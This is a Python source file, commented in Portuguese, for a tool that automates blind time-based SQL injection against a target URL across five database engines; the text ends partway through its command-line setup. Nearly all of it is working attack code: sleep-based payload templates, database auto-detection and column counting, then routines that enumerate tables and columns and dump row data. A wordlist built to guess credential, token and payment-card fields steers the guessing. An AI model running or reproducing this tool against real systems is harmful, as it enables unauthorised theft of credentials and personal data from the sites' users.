#!/usr/bin/env python3

"""
SQLi Tool — Blind Time-Based SQL Injection Automation
======================================================

Suporta: MySQL, PostgreSQL, Oracle, MSSQL, SQLite

Exemplos:

    # MySQL via POST
    python sqli_tool.py --url http://target.com/login --method POST --db-type mysql

    # PostgreSQL via GET com wordlist
    python sqli_tool.py --url http://target.com/search --method GET --db-type postgres --wordlist names.txt

    # Auto-detect do banco
    python sqli_tool.py --url http://target.com/login --method POST --db-type auto

    # Apenas detectar colunas (sem dump completo)
    python sqli_tool.py --url http://target.com/login --method POST --db-type mysql --only-columns

Parâmetros HTTP customizados:

    --post-data  'username={payload}&password=x'   (POST form)
    --get-param  'q'                               (GET query param)
    --header     'X-Search: {payload}'             (header injection)
    --cookie     'session=abc; search={payload}'   (cookie injection)
"""

from __future__ import annotations

import argparse
import string
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

import requests

# ═══════════════════════════════════════════════════════════════════
# Constantes
# ═══════════════════════════════════════════════════════════════════

SLEEP_SECONDS = 3

VALID_CHARS_META = "abcdefghijklmnopqrstuvwxyz0123456789_"
VALID_CHARS_DATA = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "_-@.#$!%&*()+=[]{}|;:,.<>?~^"
)

# ═══════════════════════════════════════════════════════════════════
# Configuração global
# ═══════════════════════════════════════════════════════════════════

_config: dict = {
    "url": None,
    "method": "POST",
    "timeout": 10,
    "post_data": None,       # template com {payload}, ex: "user={payload}&pass=x"
    "get_param": None,       # nome do parâmetro GET, ex: "q"
    "inject_header": None,   # template com {payload}, ex: "X-Search: {payload}"
    "inject_cookie": None,   # template com {payload}, ex: "session=x; q={payload}"
    "extra_headers": {},     # headers fixos (Authorization, etc.)
    "extra_cookies": {},     # cookies fixos
    # Contexto SQL de fechamento:
    #   inject_prefix: o que vem ANTES do payload SQL gerado
    #                  ex: "%')" fecha  LIKE '%...'  dentro de um parêntese
    #                  ex: "'"  fecha  = '...'  simples
    #   inject_suffix: o que vem APÓS  (geralmente vazio — o comentário já fecha)
    "inject_prefix": "'",    # padrão: fecha aspas simples
    "inject_suffix": "",
}

# ═══════════════════════════════════════════════════════════════════
# Dialetos SQL — templates por banco
# ═══════════════════════════════════════════════════════════════════

@dataclass
class Dialect:
    name: str

    # ── Detecção ───────────────────────────────────────────────────
    detect_probe: str          # payload que causa sleep se o banco for este

    # ── Sleep ──────────────────────────────────────────────────────
    sleep_fn: str              # ex: "SLEEP(3)"  ou  "pg_sleep(3)"

    # ── Substring ─────────────────────────────────────────────────
    # Deve conter {expr}, {pos}, {len}
    substring_fn: str

    # ── Banco atual ────────────────────────────────────────────────
    current_db_expr: str

    # ── Schema de tabelas ──────────────────────────────────────────
    # Deve conter {db} e {offset}
    tables_query: str

    # ── Schema de colunas ─────────────────────────────────────────
    # Deve conter {db}, {table} e {offset}
    columns_query: str

    # ── Template de injeção booleana (time-based) ─────────────────
    # Deve conter {condition}  →  dorme se condition for TRUE
    bool_sleep_template: str

    # ── Template ORDER BY (detecção de colunas) ───────────────────
    orderby_template: str

    # ── Templates UNION (detecção de colunas visíveis) ────────────
    # Deve conter {cols} e {n}  (lista de nulls + posição injetável)
    union_null_template: str | None = None

    # ── Prefixo/sufixo padrão para fechar strings abertas ─────────
    str_prefix: str = "'"
    str_suffix: str = ""

    # ── Comentário inline ─────────────────────────────────────────
    comment: str = "-- -"


# ── MySQL ─────────────────────────────────────────────────────────
MYSQL = Dialect(
    name="mysql",
    detect_probe="' AND SLEEP(3)-- -",
    sleep_fn="SLEEP(3)",
    substring_fn="SUBSTRING({expr},{pos},{len})",
    current_db_expr="SELECT DATABASE()",
    tables_query=(
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_schema='{db}' LIMIT {offset},1"
    ),
    columns_query=(
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_schema='{db}' AND table_name='{table}' LIMIT {offset},1"
    ),
    bool_sleep_template="IF(({condition}),SLEEP(3),NULL)",
    orderby_template="{prefix} ORDER BY {n}-- -",
    union_null_template="UNION SELECT {cols}-- -",
    str_prefix="'",
    comment="-- -",
)

# ── PostgreSQL ────────────────────────────────────────────────────
POSTGRES = Dialect(
    name="postgres",
    detect_probe="' AND (SELECT pg_sleep(3))-- -",
    sleep_fn="pg_sleep(3)",
    substring_fn="SUBSTRING({expr},{pos},{len})",
    current_db_expr="SELECT current_database()",
    tables_query=(
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_catalog='{db}' AND table_schema='public' "
        "LIMIT 1 OFFSET {offset}"
    ),
    columns_query=(
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_catalog='{db}' AND table_name='{table}' "
        "LIMIT 1 OFFSET {offset}"
    ),
    bool_sleep_template=(
        # Forma correta para PostgreSQL time-based:
        # pg_sleep só é chamado se a condição for verdadeira.
        # O cast ::text garante que o AND aceite o retorno no WHERE.
        "(SELECT pg_sleep(3) WHERE {condition})::text IS NOT NULL"
    ),
    orderby_template="{prefix} ORDER BY {n}-- -",
    union_null_template="UNION SELECT {cols}-- -",
    str_prefix="'",
    comment="-- -",
)

# ── MSSQL ─────────────────────────────────────────────────────────
MSSQL = Dialect(
    name="mssql",
    detect_probe="'; WAITFOR DELAY '0:0:3'-- -",
    sleep_fn="WAITFOR DELAY '0:0:3'",
    substring_fn="SUBSTRING({expr},{pos},{len})",
    current_db_expr="SELECT DB_NAME()",
    tables_query=(
        "SELECT TOP 1 table_name FROM information_schema.tables "
        "WHERE table_catalog='{db}' AND table_type='BASE TABLE' "
        "ORDER BY table_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
    ),
    columns_query=(
        "SELECT TOP 1 column_name FROM information_schema.columns "
        "WHERE table_catalog='{db}' AND table_name='{table}' "
        "ORDER BY ordinal_position OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
    ),
    bool_sleep_template=(
        # MSSQL: IF é statement, não expressão — usa via subquery com divisão por zero
        # Se condition = true → 1/0 causa erro; se false → retorna 0 sem sleep.
        # Alternativa mais confiável: CASE como expressão em SELECT
        "1=(SELECT CASE WHEN ({condition}) THEN (SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:3') t) ELSE 1 END)"
    ),
    orderby_template="{prefix} ORDER BY {n}-- -",
    union_null_template="UNION SELECT {cols}-- -",
    str_prefix="'",
    comment="-- -",
)

# ── Oracle ────────────────────────────────────────────────────────
ORACLE = Dialect(
    name="oracle",
    detect_probe="' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -",
    sleep_fn="DBMS_PIPE.RECEIVE_MESSAGE('a',3)",
    substring_fn="SUBSTR({expr},{pos},{len})",
    current_db_expr="SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL",
    tables_query=(
        "SELECT table_name FROM all_tables "
        "WHERE owner=UPPER('{db}') "
        "ORDER BY table_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
    ),
    columns_query=(
        "SELECT column_name FROM all_tab_columns "
        "WHERE owner=UPPER('{db}') AND table_name=UPPER('{table}') "
        "ORDER BY column_id OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
    ),
    bool_sleep_template=(
        "CASE WHEN ({condition}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) ELSE NULL END"
    ),
    orderby_template="{prefix} ORDER BY {n}-- -",
    union_null_template=None,   # Oracle exige FROM DUAL
    str_prefix="'",
    comment="-- -",
)

# ── SQLite ────────────────────────────────────────────────────────
SQLITE = Dialect(
    name="sqlite",
    detect_probe="' AND 1=randomblob(100000000)-- -",   # heavy I/O simula delay
    sleep_fn="randomblob(100000000)",
    substring_fn="SUBSTR({expr},{pos},{len})",
    current_db_expr="SELECT 'main'",   # SQLite não tem função de banco nativo
    tables_query=(
        "SELECT name FROM sqlite_master WHERE type='table' "
        "LIMIT 1 OFFSET {offset}"
    ),
    columns_query=(
        # SQLite: PRAGMA não funciona em subquery; usar info table via hack
        "SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}"
    ),
    bool_sleep_template=(
        "CASE WHEN ({condition}) THEN randomblob(100000000) ELSE NULL END"
    ),
    orderby_template="{prefix} ORDER BY {n}-- -",
    union_null_template="UNION SELECT {cols}-- -",
    str_prefix="'",
    comment="-- -",
)

DIALECTS: dict[str, Dialect] = {
    "mysql": MYSQL,
    "postgres": POSTGRES,
    "mssql": MSSQL,
    "oracle": ORACLE,
    "sqlite": SQLITE,
}

# ═══════════════════════════════════════════════════════════════════
# Requisição HTTP
# ═══════════════════════════════════════════════════════════════════

def make_request(payload: str, verbose: bool = False) -> dict:
    """
    Envia payload ao alvo usando as configurações globais.
    Suporta POST form, GET param, header e cookie injection.
    Nunca lança exceção em erros HTTP (4xx/5xx são respostas válidas para SQLi).
    """
    url      = _config["url"]
    method   = _config["method"].upper()
    timeout  = _config["timeout"]
    headers  = dict(_config["extra_headers"])
    cookies  = dict(_config["extra_cookies"])

    # ── Injection points ──────────────────────────────────────────
    params = {}
    data   = {}

    if _config["inject_header"]:
        key, _, val = _config["inject_header"].partition(":")
        headers[key.strip()] = val.strip().replace("{payload}", payload)

    if _config["inject_cookie"]:
        for part in _config["inject_cookie"].split(";"):
            k, _, v = part.strip().partition("=")
            cookies[k.strip()] = v.strip().replace("{payload}", payload)

    if method == "POST":
        if _config["post_data"]:
            raw = _config["post_data"].replace("{payload}", payload)
            for part in raw.split("&"):
                k, _, v = part.partition("=")
                data[k] = v
        else:
            # fallback genérico
            data = {"username": payload, "password": "x"}

    elif method == "GET":
        param = _config["get_param"] or "q"
        params[param] = payload

    else:
        raise ValueError(f"Método não suportado: {method}")

    try:
        response = requests.request(
            method,
            url,
            params=params if method == "GET" else None,
            data=data if method == "POST" else None,
            headers=headers,
            cookies=cookies,
            timeout=timeout,
            allow_redirects=True,
        )

        result = {
            "url": response.url,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "response_time_seconds": response.elapsed.total_seconds(),
            "content_length": len(response.text),
            "content_type": response.headers.get("Content-Type", ""),
            "body": response.text,
        }

        if verbose:
            print(
                f"    [HTTP] {response.status_code} "
                f"{result['content_length']}b "
                f"{result['response_time_seconds']:.2f}s"
            )

        return result

    except requests.exceptions.ConnectionError:
        print(f"[!] Erro de conexão com {url}")
        raise
    except requests.exceptions.Timeout:
        print(f"[!] Timeout após {timeout}s")
        raise

# ═══════════════════════════════════════════════════════════════════
# Detecção automática de banco
# ═══════════════════════════════════════════════════════════════════

def detect_dialect() -> Dialect | None:
    """
    Envia probes específicas por banco e retorna o primeiro que causar sleep.
    Ordem: MySQL → PostgreSQL → MSSQL → Oracle → SQLite.
    """
    order = ["mysql", "postgres", "mssql", "oracle", "sqlite"]
    print("[*] Auto-detect: testando dialetos...")

    for name in order:
        d = DIALECTS[name]
        print(f"  Testando {name.upper()}: {repr(d.detect_probe)}", end=" ", flush=True)
        start = time.time()
        try:
            make_request(d.detect_probe)
        except Exception:
            print("ERRO")
            continue
        elapsed = time.time() - start
        print(f"→ {elapsed:.2f}s")
        if elapsed >= SLEEP_SECONDS:
            print(f"[+] Banco detectado: {name.upper()}")
            return d

    print("[!] Não foi possível detectar o banco automaticamente.")
    return None

# ═══════════════════════════════════════════════════════════════════
# Modelo de frequência de caracteres (Markov bigrama)
# ═══════════════════════════════════════════════════════════════════

class CharFrequencyModel:
    """
    Ordena charset pelo caractere mais provável dado o prefixo atual,
    usando bigramas construídos a partir de um corpus de nomes SQL comuns.
    """

    DEFAULT_CORPUS = [
        # Bancos
        "mysql", "sys", "information_schema", "performance_schema",
        "wordpress", "joomla", "drupal", "magento", "prestashop",
        "app", "db", "database", "prod", "production", "dev", "staging",
        "test", "backup", "main", "core", "portal", "api",
        # Tabelas — auth
        "users", "user", "members", "accounts", "admins", "admin",
        "administrators", "auth", "credentials", "logins", "staff",
        "employees", "customers", "clients", "profiles", "profile",
        # Tabelas — conteúdo
        "posts", "articles", "pages", "comments", "messages", "orders",
        "products", "items", "inventory", "categories", "tags", "payments",
        "transactions", "invoices", "cart", "reviews", "news", "blog",
        # Tabelas — sistema
        "sessions", "tokens", "logs", "audit_log", "events",
        "notifications", "settings", "config", "options", "roles",
        "permissions", "groups", "files", "uploads", "attachments",
        "emails", "jobs", "queue", "tasks", "migrations", "cache",
        # WordPress
        "wp_users", "wp_posts", "wp_options", "wp_comments",
        "wp_terms", "wp_postmeta", "wp_usermeta",
        # Colunas — identidade
        "id", "uid", "uuid", "user_id", "account_id", "member_id",
        # Colunas — auth
        "username", "user_name", "login", "handle", "nickname",
        "password", "passwd", "pass", "pwd", "password_hash",
        "password_digest", "encrypted_password", "hashed_password",
        "salt", "hash", "secret", "api_key", "api_secret",
        "token", "access_token", "refresh_token", "auth_token",
        "reset_token", "activation_token", "two_factor_secret",
        # Colunas — contato
        "email", "email_address", "mail", "phone", "phone_number",
        "mobile", "address", "city", "state", "country", "zip",
        # Colunas — nome
        "name", "full_name", "display_name", "first_name", "last_name",
        "firstname", "lastname",
        # Colunas — status
        "status", "active", "is_active", "enabled", "verified",
        "banned", "blocked", "role", "roles", "permission", "level", "type",
        # Colunas — datas
        "created_at", "updated_at", "deleted_at", "last_login",
        "last_seen", "expires_at", "birth_date", "dob",
        # Colunas — dados sensíveis
        "ssn", "credit_card", "card_number", "cvv", "balance",
        "salary", "ip_address", "ip", "user_agent",
        # Colunas — conteúdo
        "title", "slug", "content", "body", "description",
        "summary", "text", "url", "link", "image", "avatar",
        "filename", "file_path", "mime_type", "size",
        # Valores comuns
        "admin", "administrator", "root", "superuser", "test", "guest",
        "true", "false", "null", "active", "inactive", "pending",
        "approved", "enabled", "disabled", "banned", "verified",
    ]

    def __init__(self, corpus: list[str] | None = None):
        self.bigrams:  dict[str, dict[str, int]] = {}
        self.unigrams: dict[str, int] = {}
        self._build(corpus or self.DEFAULT_CORPUS)

    def _build(self, corpus: list[str]):
        for word in corpus:
            word = word.lower()
            for i, ch in enumerate(word):
                self.unigrams[ch] = self.unigrams.get(ch, 0) + 1
                if i > 0:
                    prev = word[i - 1]
                    self.bigrams.setdefault(prev, {})
                    self.bigrams[prev][ch] = self.bigrams[prev].get(ch, 0) + 1

    def rank_chars(self, prefix: str, charset: str) -> list[str]:
        last = prefix[-1].lower() if prefix else ""
        context = self.bigrams.get(last, {})
        return sorted(charset, key=lambda ch: context.get(ch, 0) * 10 + self.unigrams.get(ch, 0), reverse=True)

# ═══════════════════════════════════════════════════════════════════
# Wordlist matcher
# ═══════════════════════════════════════════════════════════════════

class WordlistMatcher:
    """
    Tenta adivinhar o valor completo por uma wordlist antes de
    recorrer à extração caractere a caractere.
    """

    def __init__(self, words: list[str] | None = None):
        self.words = [w.lower() for w in (words or CharFrequencyModel.DEFAULT_CORPUS)]

    def candidates(self, prefix: str, top_n: int = 15) -> list[str]:
        prefix = prefix.lower()
        matches = [w for w in self.words if w.startswith(prefix) and w != prefix]
        return sorted(set(matches), key=len)[:top_n]

    def load_file(self, path: str):
        p = Path(path)
        if p.exists():
            self.words = [
                line.strip().lower()
                for line in p.read_text(encoding="utf-8", errors="ignore").splitlines()
                if line.strip()
            ]
            print(f"[*] Wordlist: {len(self.words)} entradas de '{path}'")

# ═══════════════════════════════════════════════════════════════════
# Motor de injeção — construção de payloads por dialeto
# ═══════════════════════════════════════════════════════════════════

class Injector:
    """
    Constrói e dispara payloads time-based para um dialeto específico.

    Todos os templates recebem {guess} e {length} para compatibilidade
    com o motor de extração existente.
    """

    def __init__(self, dialect: Dialect):
        self.d = dialect

    # ── Substring booleana ────────────────────────────────────────

    def _substr_eq_condition(self, expr: str, position: int, guess: str) -> str:
        """
        Produz: SUBSTRING((expr), 1, len) = 'guess'
        Subqueries (SELECT ...) são automaticamente envolvidas em parênteses,
        pois SUBSTRING(SELECT ..., 1, 1) é SQL inválido em todos os bancos.
        """
        d = self.d
        # Subquery precisa de parênteses extras dentro do SUBSTRING/SUBSTR
        wrapped = f"({expr})" if expr.strip().upper().startswith("SELECT") else expr
        sub = d.substring_fn.format(expr=wrapped, pos=1, len=len(guess))
        return f"{sub}='{guess}'"

    def build_payload(self, expr: str, guess: str) -> str:
        """
        Payload completo que dorme se SUBSTRING(expr,1,len)=guess.

        Usa inject_prefix/_suffix do _config para fechar o contexto SQL real
        do endpoint (ex: "%')" para LIKE '%...'), tornando o payload genérico.
        """
        d           = self.d
        prefix      = _config["inject_prefix"]
        suffix      = _config["inject_suffix"]
        condition   = self._substr_eq_condition(expr, 1, guess)
        sleep_block = d.bool_sleep_template.format(condition=condition)
        return f"{prefix} AND {sleep_block} {d.comment}{suffix}"

    def build_orderby_payload(self, prefix_payload: str, n: int) -> str:
        d = self.d
        return d.orderby_template.format(prefix=prefix_payload, n=n)

    # ── Expressões de metadados ───────────────────────────────────

    def db_expr(self) -> str:
        return self.d.current_db_expr

    def tables_expr(self, db: str, offset: int) -> str:
        return self.d.tables_query.format(db=db, offset=offset)

    def columns_expr(self, db: str, table: str, offset: int) -> str:
        return self.d.columns_query.format(db=db, table=table, offset=offset)

    def data_expr(self, table: str, column: str, offset: int) -> str:
        # Sem schema: funciona para MySQL, SQLite, MSSQL
        # Para Oracle/Postgres com schema: caller passa table qualificada
        return f"SELECT {column} FROM {table} LIMIT {offset},1" \
            if self.d.name in ("mysql", "sqlite") \
            else f"SELECT {column} FROM {table} OFFSET {offset} LIMIT 1"

# ═══════════════════════════════════════════════════════════════════
# Motor de extração unificado
# ═══════════════════════════════════════════════════════════════════

def _sleep_if_true(payload: str) -> bool:
    """Retorna True se a requisição com payload causou sleep."""
    start = time.time()
    make_request(payload)
    return (time.time() - start) >= SLEEP_SECONDS


def extract_value(
    injector: Injector,
    sql_expr: str,
    model: CharFrequencyModel,
    wordlist: WordlistMatcher,
    charset: str = VALID_CHARS_META,
    max_length: int = 64,
    label: str = "",
) -> str:
    """
    Extrai um valor string de sql_expr via blind time-based injection.

    Estratégia:
        1. Wordlist — tenta candidatos completos primeiro
        2. Bigrama  — varredura linear ordenada por frequência
        3. Confirma fim de string tentando um char adicional
    """
    extracted = ""

    def query_fn(guess: str) -> bool:
        payload = injector.build_payload(sql_expr, guess)
        hit = _sleep_if_true(payload)
        print(
            f"  [{'+' if hit else ' '}] {repr(guess):40s}",
            end="\r", flush=True
        )
        return hit

    def confirm_end(value: str) -> bool:
        """Confirma que não existe char seguinte."""
        for ch in charset:
            probe = value + ch
            payload = injector.build_payload(sql_expr, probe)
            start = time.time()
            make_request(payload)
            elapsed = time.time() - start
            print(f"  [?] fim? {repr(probe)}", end="\r", flush=True)
            if elapsed >= SLEEP_SECONDS:
                return False   # ainda tem mais
        return True

    while len(extracted) < max_length:

        # ── Etapa 1: wordlist ─────────────────────────────────────
        candidates = wordlist.candidates(extracted, top_n=20)
        for candidate in candidates:
            if query_fn(candidate):
                print(f"\n  [W] Candidata: '{candidate}' — confirmando fim...")
                if confirm_end(candidate):
                    print(f"\n  [W] Confirmado: '{candidate}'")
                    return candidate
                else:
                    print(f"\n  [~] Prefixo: '{candidate}'")
                    extracted = candidate
                    break
        else:
            # ── Etapa 2: varredura por bigrama ────────────────────
            ranked = model.rank_chars(extracted, charset)
            found = None
            for ch in ranked:
                if query_fn(extracted + ch):
                    found = ch
                    break

            if found:
                extracted += found
                print(f"\n  [B] '{found}' → '{extracted}'")
            else:
                print(f"\n[+] Fim: '{extracted}'")
                break

    if len(extracted) == max_length:
        print(f"[!] Limite {max_length} chars: '{extracted}'")

    return extracted

# ═══════════════════════════════════════════════════════════════════
# Detecção de colunas (ORDER BY)
# ═══════════════════════════════════════════════════════════════════

def detect_columns(
    max_columns: int = 20,
    baseline_n: int = 2,
    threshold: float = 0.10,
) -> int:
    """
    Detecta número de colunas via ORDER BY {n}.

    Usa inject_prefix/_suffix de _config para fechar o contexto SQL correto.
    Ex: prefix="%')"  → payload = "%') ORDER BY 3-- -"
        prefix="'"    → payload = "' ORDER BY 3-- -"

    Retorna contagem de colunas ou -1 se não detectado.
    Além da detecção por variação de tamanho (baseline), também detecta
    erro de SQL (mudança brusca de status HTTP ou queda no tamanho) que
    indica que ORDER BY {i} é inválido.
    """
    prefix = _config["inject_prefix"]
    suffix = _config["inject_suffix"]
    results: list[dict] = []

    for i in range(1, max_columns + 1):
        payload = f"{prefix} ORDER BY {i}-- -{suffix}"
        res = make_request(payload)
        length = res["content_length"]
        status = res["status_code"]
        results.append({"index": i, "length": length, "status": status})
        print(f"  ORDER BY {i}: {length} bytes (HTTP {status})")

        if i <= baseline_n:
            continue

        baseline_len    = sum(r["length"] for r in results[:baseline_n]) / baseline_n
        baseline_status = results[0]["status"]
        deviation       = abs(length - baseline_len) / (baseline_len or 1)

        # Critério 1: variação de tamanho acima do threshold
        if deviation > threshold:
            total = i - 1
            print(
                f"\n[!] Mudança em ORDER BY {i} "
                f"({length}b vs baseline {baseline_len:.0f}b)\n"
                f"[+] Colunas detectadas: {total}"
            )
            return total

        # Critério 2: status HTTP mudou (ex: 200→500 indica erro SQL)
        if status != baseline_status:
            total = i - 1
            print(
                f"\n[!] HTTP {baseline_status}→{status} em ORDER BY {i}\n"
                f"[+] Colunas detectadas: {total}"
            )
            return total

    print(f"[!] Colunas não detectadas em {max_columns} tentativas.")
    return -1

# ═══════════════════════════════════════════════════════════════════
# Funções de alto nível
# ═══════════════════════════════════════════════════════════════════

def fuzz_db(injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher) -> str:
    print("[*] Extraindo banco atual...")
    result = extract_value(injector, injector.db_expr(), model, wl, charset=VALID_CHARS_META, label="db")
    print(f"[+] Database: '{result}'")
    return result


def fuzz_table(
    injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher,
    db: str, offset: int, exclude: set[str] = set(),
) -> str:
    expr = injector.tables_expr(db, offset)
    result = extract_value(injector, expr, model, wl, charset=VALID_CHARS_META, label=f"table[{offset}]")
    return result


def fuzz_column(
    injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher,
    db: str, table: str, offset: int, exclude: set[str] = set(),
) -> str:
    expr = injector.columns_expr(db, table, offset)
    result = extract_value(injector, expr, model, wl, charset=VALID_CHARS_META, label=f"col[{offset}]")
    return result


def fuzz_data_value(
    injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher,
    table: str, column: str, offset: int,
) -> str:
    expr = injector.data_expr(table, column, offset)
    result = extract_value(injector, expr, model, wl, charset=VALID_CHARS_DATA, label=f"{column}[{offset}]")
    return result


def fuzz_all_tables(
    injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher,
    db: str, max_tables: int = 20,
) -> list[str]:
    print(f"\n[*] Mapeando tabelas de '{db}'...")
    tables: list[str] = []
    seen: set[str] = set()

    for offset in range(max_tables):
        name = fuzz_table(injector, model, wl, db, offset, exclude=seen)
        if not name or name in seen:
            break
        seen.add(name)
        tables.append(name)
        print(f"  [+] Tabela [{offset}]: '{name}'")

    return tables


def fuzz_all_columns(
    injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher,
    db: str, table: str, max_cols: int = 20,
) -> list[str]:
    print(f"\n[*] Mapeando colunas de '{db}.{table}'...")
    cols: list[str] = []
    seen: set[str] = set()

    for offset in range(max_cols):
        name = fuzz_column(injector, model, wl, db, table, offset, exclude=seen)
        if not name or name in seen:
            break
        seen.add(name)
        cols.append(name)
        print(f"  [+] Coluna [{offset}]: '{name}'")

    return cols


def fuzz_all_data(
    injector: Injector, model: CharFrequencyModel, wl: WordlistMatcher,
    db: str, table: str, columns: list[str], max_rows: int = 50,
) -> list[dict]:
    print(f"\n[*] Extraindo dados de '{db}.{table}'...")
    rows: list[dict] = []

    for row_i in range(max_rows):
        print(f"\n  [*] Linha {row_i}...")
        row: dict[str, str] = {}

        for col in columns:
            print(f"    Coluna '{col}'...")
            value = fuzz_data_value(injector, model, wl, table, col, row_i)
            row[col] = value
            print(f"    [+] {col} = '{value}'")

        if not any(row.values()):
            print(f"  [*] Sem mais linhas após {row_i}.")
            break

        rows.append(row)

    return rows

# ═══════════════════════════════════════════════════════════════════
# Exibição
# ═══════════════════════════════════════════════════════════════════

def print_table(label: str, rows: list[dict]):
    if not rows:
        print(f"  {label}: (sem dados)")
        return

    cols = list(rows[0].keys())
    widths = {c: max(len(c), max((len(r.get(c, "")) for r in rows), default=0)) for c in cols}
    sep    = "+-" + "-+-".join("-" * widths[c] for c in cols) + "-+"
    header = "| " + " | ".join(c.ljust(widths[c]) for c in cols) + " |"

    print(f"\n  {label}")
    print(f"  {sep}")
    print(f"  {header}")
    print(f"  {sep}")
    for row in rows:
        line = "| " + " | ".join(row.get(c, "").ljust(widths[c]) for c in cols) + " |"
        print(f"  {line}")
    print(f"  {sep}")

# ═══════════════════════════════════════════════════════════════════
# Orquestrador principal
# ═══════════════════════════════════════════════════════════════════

def execute(
    dialect: Dialect,
    wordlist_path: str | None = None,
    only_columns: bool = False,
    max_tables: int = 20,
    max_cols: int = 20,
    max_rows: int = 50,
    known_db: str | None = None,
    known_tables: list[str] | None = None,
):
    """
    Orquestra o dump completo.

    Parâmetros de atalho:
      known_db     — pula a Etapa 2 (extração do banco) e usa o nome fornecido.
      known_tables — pula as Etapas 3 e vai direto para colunas/dados dessas tabelas.
                     Aceita lista de nomes separados por vírgula ou lista Python.
    """
    print(f"[*] Alvo   : {_config['url']} [{_config['method'].upper()}]")
    print(f"[*] Banco  : {dialect.name.upper()}")
    print(f"[*] Prefix : {repr(_config['inject_prefix'])}")
    if known_db:
        print(f"[*] DB fixo: {known_db}")
    if known_tables:
        print(f"[*] Tabelas: {known_tables}")
    print()

    injector = Injector(dialect)
    model    = CharFrequencyModel()
    wl       = WordlistMatcher()

    if wordlist_path:
        wl.load_file(wordlist_path)

    # ── Etapa 1: colunas ──────────────────────────────────────────
    print("[*] Etapa 1: Detectando colunas (ORDER BY)...")
    qty = detect_columns()
    if qty == -1:
        print("[!] Abortando — colunas não detectadas.")
        return

    if only_columns:
        return

    # ── Etapa 2: banco ────────────────────────────────────────────
    if known_db:
        db = known_db
        print(f"\n[*] Etapa 2: Banco fornecido via --db-name: '{db}'")
    else:
        print(f"\n[*] Etapa 2: Identificando banco...")
        db = fuzz_db(injector, model, wl)
        if not db:
            print("[!] Abortando — banco não identificado.")
            return

    # ── Etapa 3: tabelas ──────────────────────────────────────────
    if known_tables:
        tables = known_tables
        print(f"\n[*] Etapa 3: Tabelas fornecidas via --tables: {tables}")
    else:
        print(f"\n[*] Etapa 3: Mapeando tabelas...")
        tables = fuzz_all_tables(injector, model, wl, db, max_tables=max_tables)
        if not tables:
            print("[!] Nenhuma tabela encontrada.")
            return

    # ── Etapa 4: colunas por tabela ───────────────────────────────
    print(f"\n[*] Etapa 4: Mapeando colunas...")
    schema: dict[str, list[str]] = {}
    for table in tables:
        schema[table] = fuzz_all_columns(injector, model, wl, db, table, max_cols=max_cols)

    print("\n[+] Schema:")
    for table, cols in schema.items():
        print(f"  {db}.{table}: {cols}")

    # ── Etapa 5: dados ────────────────────────────────────────────
    print(f"\n[*] Etapa 5: Extraindo dados...")
    dump: dict[str, list[dict]] = {}

    for table, cols in schema.items():
        if not cols:
            continue
        rows = fuzz_all_data(injector, model, wl, db, table, cols, max_rows=max_rows)
        dump[table] = rows
        print_table(f"{db}.{table}", rows)

    print("\n[+] Dump concluído:")
    for table, rows in dump.items():
        print(f"  {table}: {len(rows)} linha(s)")

# ═══════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="SQLi Tool — Blind Time-Based SQL Injection Automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    # ── Alvo ──────────────────────────────────────────────────────
    parser.add_argument("--url",    required=True,  help="URL do alvo")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="Método HTTP")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout em segundos")

    # ── Banco ─────────────────────────────────────────────────────
    parser.add_argument(
        "--db-type",
        default="auto",
        choices=["auto", "mysql", "postgres", "mssql", "oracle", "sqlite"],
        help="Tipo do banco (auto = detecta automaticamente)",
    )

    # ── Injection points ──────────────────────────────────────────
    parser.add_argument("--post-data",  help="Template POST, ex: 'user={payload}&pass=x'")
    parser.add_argument("--get-param",  help="Parâmetro GET, ex: 'q'")
    parser.add_argument("--header",     help="Injeção via header, ex: 'X-Search: {payload}'")
    parser.add_argument("--cookie",     help="Injeção via cookie, ex: 'session=x; q={payload}'")
    parser.add_argument(
        "--extra-header", action="append", default=[],
        help="Header fixo (pode repetir), ex: 'Authorization: Bearer abc'"
    )
    parser.add_argument(
        "--extra-cookie", action="append", default=[],
        help="Cookie fixo (pode repetir), ex: 'session=eyJ...'"
    )

    # ── Contexto SQL ─────────────────────────────────────────────
    parser.add_argument(
        "--inject-prefix",
        default="'",
        help=(
            "Fecha o contexto SQL antes do payload gerado. "
            "Padrao: aspa simples. "
            "Para LIKE com parentese use: %%'). "
            "Para subquery com parentese use: '). "
        ),
    )
    parser.add_argument(
        "--inject-suffix",
        default="",
        help="Texto após o comentário SQL (raramente necessário).",
    )

    # ── Atalhos de enumeração ────────────────────────────────────
    parser.add_argument(
        "--db-name",
        default=None,
        help=(
            "Nome do banco já conhecido — pula a extração do banco (Etapa 2). "
            "Ex: --db-name school"
        ),
    )
    parser.add_argument(
        "--tables",
        default=None,
        help=(
            "Tabelas alvo separadas por vírgula — pula o mapeamento de tabelas (Etapa 3) "
            "e vai direto para colunas e dados dessas tabelas. "
            "Ex: --tables users,professors,grades"
        ),
    )

    # ── Wordlist e limites ────────────────────────────────────────
    parser.add_argument("--wordlist",    help="Wordlist de nomes (um por linha)")
